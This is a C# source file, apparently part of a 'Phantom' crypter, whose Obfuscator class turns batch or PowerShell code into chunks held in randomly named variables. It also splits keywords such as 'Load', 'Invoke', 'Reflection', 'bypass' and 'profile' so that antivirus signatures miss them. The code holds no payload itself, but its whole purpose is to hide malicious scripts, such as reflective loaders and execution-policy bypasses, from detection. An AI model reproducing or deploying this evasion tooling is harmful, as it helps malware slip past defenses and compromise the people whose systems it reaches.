using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using static Phantom.Utils;

namespace Phantom
{
    public class Obfuscator
    {
        public static string ObfuscateBat(string code, bool ispowershellscript = false)
        {
            StringBuilder obfuscation2 = new StringBuilder();

            string Load_kw = string.Empty;
            string Invoke_kw = string.Empty;
            string Reflection_kw = string.Empty;
            string bypass_kw = string.Empty;
            string profile_kw = string.Empty;
            if (ispowershellscript)
            {
                Load_kw = RandomString(4);
                Invoke_kw = RandomString(4);
                Reflection_kw = RandomString(4);
                bypass_kw = RandomString(4);
                profile_kw = RandomString(4);
                obfuscation2.Append(@"set """ + Load_kw + @"=Lo""" + Environment.NewLine);
                obfuscation2.Append(@"set """ + Invoke_kw + @"=nvo""" + Environment.NewLine);
                obfuscation2.Append(@"set """ + Reflection_kw + @"=lect""" + Environment.NewLine);
                obfuscation2.Append(@"set """ + bypass_kw + @"=byp""" + Environment.NewLine);
                obfuscation2.Append(@"set """ + profile_kw + @"=prof""" + Environment.NewLine);
            }

            List<string> random1list = new List<string>();

            int varsize = 20;
            int blocksize = 20;
            for (int i = 0; i < code.Length; i += blocksize)
            {
                string block = code.Substring(i, Math.Min(blocksize, code.Length - i));
                string random1 = RandomString(varsize);
                random1list.Add(random1);
                if (ispowershellscript)
                {
                    block = block.Replace("Lo", "%" + Load_kw + "%");
                    block = block.Replace("nvo", "%" + Invoke_kw + "%");
                    block = block.Replace("lect", "%" + Reflection_kw + "%");
                    block = block.Replace("byp", "%" + bypass_kw + "%");
                    block = block.Replace("prof", "%" + profile_kw + "%");
                }
                obfuscation2.Append(@"set """ + random1 + @"=" + block + @"""" + Environment.NewLine);
            }

            foreach (string random2 in random1list.ToArray())
            {
                obfuscation2.Append(@"%" + random2 + @"%");
            }

            return obfuscation2.ToString().TrimEnd(Environment.NewLine.ToCharArray());
        }

        private static Random random = new Random();

        private static string RandomString(int length)
        {
            return Utils.RandomString(length, random);
        }
    }
}